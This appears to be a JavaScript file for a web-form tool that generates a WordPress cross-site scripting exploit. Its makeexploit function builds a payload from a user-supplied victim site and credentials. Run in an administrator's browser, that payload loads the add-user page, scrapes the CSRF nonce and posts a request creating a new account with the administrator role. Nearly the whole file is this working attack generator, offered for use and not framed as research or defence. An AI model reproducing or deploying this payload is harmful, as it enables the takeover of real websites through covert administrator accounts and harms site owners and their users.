
/* -- variable for gnerate xss exploit -- */
var victimsite,
    username,
    password,
    email,
    name,
    family,
    url,
    wpadmin,
    slash,
    bslash;

/* -- this function clear all filed value -- */
function clearfrm(){
    window.location.href = '#';
    document.getElementById("victiomsite").value = "";
    document.getElementById("username").value = "";
    document.getElementById("password").value = "";
    document.getElementById("email").value = "";
    document.getElementById("name").value = "";
    document.getElementById("family").value = "";
    document.getElementById("url").value = "";  
    document.getElementById("excode").value = "";
    
    //desible error and sucess alert
    document.getElementById("error").style.display = "none";
    document.getElementById("success").style.display = "none";
}

/* -- this function make custome exploid -- */
function makeexploit(){
    
     /* -- start to get all value from text fields -- */
    victimsite = document.getElementById("victiomsite").value;
    username = document.getElementById("username").value;
    password = document.getElementById("password").value;
    email = document.getElementById("email").value;
    name = document.getElementById("name").value;
    family = document.getElementById("family").value;
    url = document.getElementById("url").value;
    slash = "'/'";
    wpadmin = "'/wp-admin/'";
    bslash = "\\";
    
    if(victimsite == ""  || username == "" || password == "" || email == "" || name == "" || family == "" || url == ""){
        document.getElementById("error").style.display = "block" ;
        document.getElementById("success").style.display = "none" ;
    }else{
    
    document.getElementById("success").style.display = "block";
    document.getElementById("error").style.display = "none";
   
    /* -- start to making xss javascript exploit -- */
    var exstring = 'function httpGet(theUrl)';
    exstring += '{var xmlHttp = null;xmlHttp = new XMLHttpRequest();';
    exstring += 'xmlHttp.open( "GET", theUrl, false );xmlHttp.send( null );return xmlHttp.responseText;}';
    exstring += 'var current_location = window.location.href;';
    exstring += 'var trimmed = current_location.split(' + wpadmin + ')[0] + ' + slash + ';';
    exstring += 'var path_variable = ' + slash + ' + trimmed.split(' + slash + ').slice(3,-1).join(' + slash + ') + ' + slash + ';';
    exstring += 'var trigger = path_variable + "' + victimsite + '/wp-admin/user-new.php";';
    exstring += 'var page = httpGet(trigger);';
    exstring += 'function httpPost(theUrl, csrftoken){var xmlHttp = null;xmlHttp = new XMLHttpRequest();xmlHttp.open( "POST", theUrl, false);xmlHttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");';
    exstring += 'xmlHttp.send("action=createuser&_wpnonce_create-user=" + csrftoken + "&_wp_http_referer=" + encodeURI(theUrl) + "&user_login=' + username + '&email=' + email + '&first_name=' + name + '&last_name=' + family + '&url=' + url + '&pass1=' + password + '&pass2='            + password + '&role=administrator&createuser=Add+New+User+");';
    exstring += 'return xmlHttp.responseText;';
    exstring += '}';
    exstring += 'var regExp = /name='+ bslash +'"_wpnonce_create-user' + bslash + '"' + bslash + 'svalue=' + bslash + '"([^)]+)' + bslash + '"/;';
    exstring += 'var matches = regExp.exec(page);';
    exstring += 'var csrftoken = matches[1].slice(0, 10);';
    exstring += 'httpPost(trigger, csrftoken);';
    
    
    /* -- add exploit code to textare -- */
    document.getElementById("excode").value = exstring;
        
    }
   
    
}
